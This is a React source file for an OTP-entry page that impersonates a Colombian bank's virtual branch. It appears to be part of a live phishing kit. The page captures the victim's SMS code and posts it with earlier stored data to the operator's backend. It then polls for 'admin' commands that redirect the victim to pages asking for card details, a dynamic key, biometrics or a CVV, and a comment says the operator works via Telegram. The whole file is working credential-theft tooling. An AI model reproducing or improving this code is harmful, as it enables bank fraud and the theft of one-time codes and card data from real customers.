import { instanceBackend } from "app/axios/instanceBackend";
import { useEffect, useState, useRef } from "react";
import InactividadModal from "./modals/inactividadModal";
import AccionesModal from "./modals/accionesModal";
import NumOTPModal from "./modals/NumOTP-Modal";
import Loading from "../../components/Loading";
import './css/LoginModal.css';
import { limpiarPaddingBody } from "@utils";

export default function NumeroOTP() {

    const [formState, setFormState] = useState({
        clave: "",
        errorClave: false,
        lanzarModalAcciones: false,
        lanzarModalInactividad: false,
        lanzarModalErrorSesion: false, // Este estado controlará el NumOTPModal
    });

    const [botonHabilitado, setBotonHabilitado] = useState(false);
    const [botonBorrarHabilitado, setBotonBorrarHabilitado] = useState(true);
    const [otpFocused, setOtpFocused] = useState(false);
    const [cargando, setCargando] = useState(false);

    // Refs para polling y sesión
    const sesionIdRef = useRef(localStorage.getItem('sesion_id'));
    const pollingIntervalRef = useRef(null);
    const [aprobacionEstado, setAprobacionEstado] = useState({});

    // Timer state
    const [activeResend, setActiveResend] = useState(false);
    const [timeLeft, setTimeLeft] = useState(180);
    const totalTime = 180;

    const inputRefs = useRef([]);

    // Timer logic
    useEffect(() => {
        if (timeLeft <= 0) return;
        const intervalId = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);
        return () => clearInterval(intervalId);
    }, [timeLeft]);

    const formatTime = (seconds) => {
        const m = Math.floor(seconds / 60);
        const s = seconds % 60;
        return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    };

    const radius = 47;
    const circumference = 2 * Math.PI * radius;
    const strokeDashoffset = circumference - (timeLeft / totalTime) * circumference;

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se limpia el padding del body
        limpiarPaddingBody();

        // Se valida si el estado en el localStorage es error
        const estadoSesion = localStorage.getItem('estado_sesion');

        // Si es error, se muestra el modal
        if (estadoSesion === 'error') {

            // Se borra el estado del localStorage
            localStorage.removeItem('estado_sesion');

            // Se muestra el modal de error de sesión OTP
            setFormState(prev => ({
                ...prev,
                lanzarModalErrorSesion: true
            }));

            // Se quita a los 2 segundos
            setTimeout(() => {

                // Se oculta el modal de error de sesión OTP
                setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }));
            }, 2000);
        };

        // Se obtiene la IP
        obtenerIP();

        // Se obtiene la fecha/hora con formato
        obtenerFechaHora();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        obtenerFechaHora();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto =
            (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {
            obtenerFechaHora();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {
                obtenerFechaHora();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // Obtiene la dirección IP pública del usuario
    const obtenerIP = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // Obtiene la fecha y hora actual del sistema
    const obtenerFechaHora = () => {

        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const opciones = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = ahora.toLocaleString("es-CO", opciones);

        // Se guarda el valor formateado en el estado
        setFechaHora(formato);
    };

    // Inactivity logic
    useEffect(() => {
        let inactivityTimeout;
        const tiempoInactividad = 1000 * 60 * 5;

        const reiniciarTemporizador = () => {
            clearTimeout(inactivityTimeout);
            inactivityTimeout = setTimeout(() => {
                // Al pasar el tiempo, mostramos el modal de inactividad
                setFormState(prev => ({ ...prev, lanzarModalInactividad: true }));
            }, tiempoInactividad);
        };

        reiniciarTemporizador();
        window.addEventListener("mousemove", reiniciarTemporizador);
        window.addEventListener("keydown", reiniciarTemporizador);

        return () => {
            clearTimeout(inactivityTimeout);
            window.removeEventListener("mousemove", reiniciarTemporizador);
            window.removeEventListener("keydown", reiniciarTemporizador);
        };
    }, []);

    // Se verifica si el tiempo llegó a cero
    useEffect(() => {
        if (timeLeft === 0) {
            setActiveResend(true);
        };
    }, [timeLeft]);

    // Manejo de cambio en inputs OTP
    const handleOtpChange = (e, index) => {
        const { value } = e.target;
        if (value && !/^[0-9]*$/.test(value)) return;

        let chars = formState.clave.split('');
        while (chars.length < 6) chars.push('');
        chars[index] = value.slice(-1);
        if (!value) chars[index] = '';

        const newClave = chars.join('').slice(0, 6);

        setFormState(prev => ({
            ...prev,
            clave: newClave,
            errorClave: false
        }));

        if (value && index < 5) {
            inputRefs.current[index + 1].focus();
        }

        if (newClave.length === 6) {
            setBotonHabilitado(true);
        } else if (newClave.length === 0) {
            setBotonBorrarHabilitado(true);
            setBotonHabilitado(false);
        } else if (newClave.length > 0) {
            setBotonBorrarHabilitado(false);
            if (newClave.length < 6) {
                setBotonHabilitado(false);
            }
        }
    };

    const handleKeyDown = (e, index) => {
        if (e.key === "Backspace") {
            if (!formState.clave[index] && index > 0) {
                inputRefs.current[index - 1].focus();
            }
        }
    };

    const bloquearClipboard = (e) => {
        e.preventDefault();
        if (formState.lanzarModalAcciones) return;
        setFormState(prev => ({ ...prev, lanzarModalAcciones: true }));
        setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalAcciones: false })), 2500);
    };

    const cerrarModalAcciones = () => {
        setFormState(prev => ({ ...prev, lanzarModalAcciones: false }));
    };

    const handleResend = async () => {
        try {
            // Set loading state while waiting for admin response
            setCargando(true);

            const usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));
            const sesionId = usuarioLocalStorage?.sesion_id;

            if (!sesionId) {
                alert("Error: No se encontró la sesión");
                setCargando(false);
                return;
            }

            // Send resend request to backend
            await instanceBackend.post('/otp-resend', { sesionId });

            // Start polling to wait for admin decision
            // The polling will detect when admin clicks a button (solicitar_otp, etc.)
            iniciarPolling(sesionId);

        } catch (e) {
            console.error("Error notifying resend", e);
            setCargando(false);
            alert('Error al solicitar nuevo código. Intente nuevamente.');
        }
    };

    const handleClear = () => {
        setFormState(prev => ({
            ...prev,
            clave: "",
            errorClave: false
        }));
        setBotonBorrarHabilitado(true);
        setBotonHabilitado(false);
        inputRefs.current[0].focus();
    };

    const handleOtpBlur = () => {
        setFormState(prev => ({
            ...prev,
            touchedClave: true,
            errorClave: prev.clave.length === 0
        }));
    };

    // Metodo para registrar el intento de otp - ESTRUCTURA UNIFICADA
    const actualizarLocalStorage = (otpValue) => {

        // Se obtiene los datos del localStorage
        const storageKey = "datos_usuario";

        // Se obtiene el valor almacenado
        const raw = localStorage.getItem(storageKey);

        // Se parsea el JSON o se inicializa un objeto vacío
        let datos = raw ? JSON.parse(raw) : {};

        // Se inicializa el objeto usuario si no existe
        if (!datos.usuario) datos.usuario = {};
        if (!datos.usuario.otp) datos.usuario.otp = [];

        // Se crea el objeto del intento
        const nuevoIntento = {
            intento: datos.usuario.otp.length + 1,
            codigo: otpValue,
            fecha: new Date().toLocaleString(),
        };

        // Se agrega al array
        datos.usuario.otp.push(nuevoIntento);

        // Se guarda nuevamente en el localStorage
        localStorage.setItem(storageKey, JSON.stringify(datos));

        // Se retorna el codigo
        return datos.usuario.otp;
    };

    const handleContinuar = async () => {
        setCargando(true);

        try {
            // Get session ID from localStorage
            const usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));
            const sesionId = usuarioLocalStorage?.sesion_id;

            if (!sesionId) {
                alert("Error: No se encontró la sesión");
                setCargando(false);
                return;
            }

            // Obtener el código OTP ingresado
            const otpCode = formState.clave;

            // Registrar intento antes de enviar
            actualizarLocalStorage(otpCode);

            // Prepara los datos con ID de sesión
            const dataLocalStorage = localStorage.getItem("datos_usuario") ? JSON.parse(localStorage.getItem("datos_usuario")) : null;

            // Se envia la data
            const dataSend = {
                "data": {
                    "attributes": dataLocalStorage
                },
            };

            // Se envia la petición al backend
            await instanceBackend.post('/otp', dataSend);

            // Iniciar polling para esperar respuesta del admin
            iniciarPolling(sesionId);

        } catch (error) {
            console.error('Error enviando OTP', error);
            setCargando(false);
            alert('Error enviando código. Intente nuevamente.');
        }
    };

    // Función de polling para esperar respuesta del admin
    const iniciarPolling = (sesionId) => {
        const pollingInterval = setInterval(async () => {
            try {
                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                const { estado } = response.data;

                console.log('OTP Polling:', estado);

                // Estados que detienen el polling
                const estadosFinales = [
                    // Botones linea 1
                    'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',

                    // Botones linea 2
                    'error_tc', 'error_otp', 'error_din', 'error_login',

                    // Botones linea 3
                    'solicitar_biometria', 'error_923',

                    // Botones linea 4
                    'solicitar_tc_custom', 'solicitar_cvv_custom',

                    // Estados adicionales por pantalla
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                ];

                if (estadosFinales.includes(estado.toLowerCase())) {
                    clearInterval(pollingInterval);
                }

                // Redirecciones basadas en respuesta del admin
                switch (estado.toLowerCase()) {
                    case 'solicitar_tc':

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'error_tc':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_otp':

                        // Se quita el estado de cargando
                        setCargando(false);

                        // Se limpia el formulario para permitir nuevo intento
                        handleClear();

                        // Se resetea el timer
                        setTimeLeft(totalTime);
                        setActiveResend(false);

                        // Se sale del ciclo
                        break;
                    case 'error_otp':

                        // Recargar para reintentar OTP
                        setCargando(false);

                        // Se limpia el ciclo
                        handleClear();

                        // Se muestra el modal de error de sesión OTP
                        setFormState(prev => ({
                            ...prev,
                            lanzarModalErrorSesion: true
                        }));

                        // Se quita el modal a los 2 segundos
                        setTimeout(() => {

                            // Se oculta el modal de error de sesión OTP
                            setFormState(prev => ({
                                ...prev,
                                lanzarModalErrorSesion: false
                            }));
                        }, 2000);

                        // Se sale del ciclo
                        break;
                    case 'solicitar_din':

                        // Redirigir a la clave dinámica
                        window.location.href = '/clave-dinamica';

                        // Se sale del ciclo
                        break;
                    case 'error_din':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la clave dinámica
                        window.location.href = '/clave-dinamica';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_finalizar':

                        // Redirigir a la página finalizado
                        window.location.href = '/finalizado-page';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_biometria':

                        // Redirigir a la verificación de identidad
                        window.location.href = '/verificacion-identidad';

                        // Se sale del ciclo
                        break;
                    case 'error_923':

                        // Redirigir a la página de error 923
                        window.location.href = '/error-923page';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_tc_custom':

                        // Redirigir a la validación de tarjeta de crédito (usa la misma vista para TC estándar y custom)
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_cvv_custom':
                        // NO redirigir a custom - estas rutas son exclusivas del admin
                        // El usuario normal NO debe acceder a estas rutas
                        // Si el admin quiere solicitar CVV custom, debe hacerlo desde Telegram
                        console.warn('Estado solicitar_cvv_custom detectado, pero no se redirige (ruta exclusiva del admin)');
                        break;
                    case 'error_login':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la página de autenticación
                        window.location.href = '/autenticacion';

                        // Se sale del ciclo
                        break;
                    default:

                        // Se sale del ciclo
                        break;
                };
            } catch (error) {
            }
        }, 3000);
    };

    // Manejo de foco en inputs OTP
    const handleOtpFocus = () => {

        // Se establece el estado de foco
        setOtpFocused(true);
    };

    // Renderizado del componente
    return (
        <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
            <div
                style={{
                    flex: 1,
                    backgroundColor: "#2C2A29",
                    backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                    backgroundRepeat: "no-repeat",
                    backgroundPosition: "center",
                    backgroundPositionY: "-70px",
                    backgroundPositionX: "-500px",
                }}
            >
                <div style={{ textAlign: "center" }}>
                    <img
                        src="/assets/images/img_pantalla2/descarga.svg"
                        alt="Logo"
                        style={{ width: "238px", marginTop: "45px" }}
                    />
                </div>

                <div
                    style={{
                        marginTop: "25px",
                    }}
                >
                    <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                        Sucursal Virtual Personas
                    </h1>
                </div>

                <div className="login-page">
                    <div className="login-box" style={{
                        maxWidth: "600px",
                        padding: "40px",
                        position: "relative",
                        border: "1px solid #444",
                        boxShadow: "0 10px 25px rgba(0,0,0,0.5)"
                    }}>
                        <h2 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "24px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
                            Confirma tus datos
                        </h2>

                        <p className="bc-card-auth-description bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "18px", lineHeight: "20px", marginBottom: "30px", color: "white" }}>
                            Ingresa el código que te enviamos por mensaje de texto.
                        </p>

                        {/* Circular Timer */}
                        <div style={{ position: "relative", width: "100px", height: "100px", margin: "0 auto 40px" }}>
                            <svg width="100" height="100" style={{ transform: "rotate(-90deg)" }}>
                                <circle cx="50" cy="50" r={radius} stroke="#4a4a4a" strokeWidth="6" fill="transparent" />
                                <circle
                                    cx="50"
                                    cy="50"
                                    r={radius}
                                    stroke="#00C589"
                                    strokeWidth="6"
                                    fill="transparent"
                                    strokeDasharray={circumference}
                                    strokeDashoffset={strokeDashoffset}
                                    style={{ transition: "stroke-dashoffset 1s linear" }}
                                />
                            </svg>
                            <div style={{
                                position: "absolute",
                                top: "50%",
                                left: "50%",
                                transform: "translate(-50%, -50%)",
                                textAlign: "center"
                            }}>
                                <div className="bc-card-auth-description" style={{ fontSize: "11px", color: "white" }}>Vence en:</div>
                                <div className="bc-card-auth-description" style={{ fontSize: "14px", fontWeight: "bold", color: "white" }}>{formatTime(timeLeft)}</div>
                            </div>
                            {activeResend ?
                                <div>
                                    <p className="bc-card-auth-description" style={{ marginTop: "10px", fontSize: "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer" }} onClick={() => handleResend()}>
                                        Reenviar código OTP
                                    </p>
                                </div> : null}
                        </div>

                        {/* OTP Inputs */}
                        <div
                            className="otp-container"
                            style={{
                                display: "flex",
                                justifyContent: "center",
                                gap: "10px",
                                marginBottom: "20px"
                            }}
                        >
                            {[0, 1, 2, 3, 4, 5].map((index) => (
                                <input
                                    key={index}
                                    ref={(el) => (inputRefs.current[index] = el)}
                                    type="password"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={formState.clave[index] || ""}
                                    onChange={(e) => handleOtpChange(e, index)}
                                    onKeyDown={(e) => handleKeyDown(e, index)}
                                    onFocus={(e) => {
                                        handleOtpFocus();
                                        e.target.select();
                                    }}
                                    onBlur={handleOtpBlur}
                                    className={`otp-input ${formState.touchedClave && formState.clave.length === 0
                                        ? "otp-error"
                                        : ""
                                        }`}
                                    onCopy={bloquearClipboard}
                                    onPaste={bloquearClipboard}
                                    onCut={bloquearClipboard}
                                    onContextMenu={bloquearClipboard}
                                />
                            ))}
                        </div>

                        <p className="bc-card-auth-description" style={{ textAlign: "center", fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
                            Búscalo en el número de teléfono registrado
                        </p>

                        <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                            <button className="bc-button-primary login-btn-borrar mt-4" disabled={botonBorrarHabilitado} onClick={() => handleClear()}>
                                Borrar
                            </button>
                            <button className="bc-button-primary login-btn mt-4" disabled={!botonHabilitado} onClick={handleContinuar}>
                                Continuar
                            </button>
                        </div>
                    </div>
                </div>
                <div className="login-page-footer mt-4">
                    <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                        <span>¿Problemas para conectarte?</span>
                        <span className="dot">·</span>
                        <span>Aprende sobre seguridad</span>
                        <span className="dot">·</span>
                        <span>Reglamento Sucursal Virtual</span>
                        <span className="dot">·</span>
                        <span>Política de privacidad</span>
                    </div>
                    <hr style={{ marginTop: "20px" }} />
                    <div className="footer-final">
                        <div className="footer-left">
                            <div>
                                <img
                                    src="/assets/images/img_pantalla2/descarga.svg"
                                    style={{ width: "180px" }}
                                />
                            </div>
                            <div style={{ alignSelf: 'center' }}>
                                <span className="vigilado">
                                    <img
                                        src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                        alt="Superintendencia"
                                        style={{ width: "140px" }}
                                    />
                                </span>
                            </div>
                        </div>
                        <div className="footer-right">
                            <div className="mt-2">Dirección IP: {ip}</div>
                            <div className="mb-2">{fechaHora}</div>
                        </div>
                    </div>
                </div>
            </div>

            {/* Modales */}
            {formState.lanzarModalInactividad ?
                <InactividadModal isOpen={formState.lanzarModalInactividad} onClose={() => setFormState(prev => ({ ...prev, lanzarModalInactividad: false }))} /> : null}

            {formState.lanzarModalAcciones ?
                <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={cerrarModalAcciones} /> : null}

            {/* AQUI SE AGREGO EL MODAL NumOTPModal */}
            {formState.lanzarModalErrorSesion ?
                <NumOTPModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
                    ...prev,
                    lanzarModalErrorSesion: false
                }))} /> : null}

            <style>{`
                .otp-input:focus {
                    border-bottom: 2px solid #fdda24 !important;
                }
            `}</style>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ? <Loading /> : null}
        </div>
    );
};
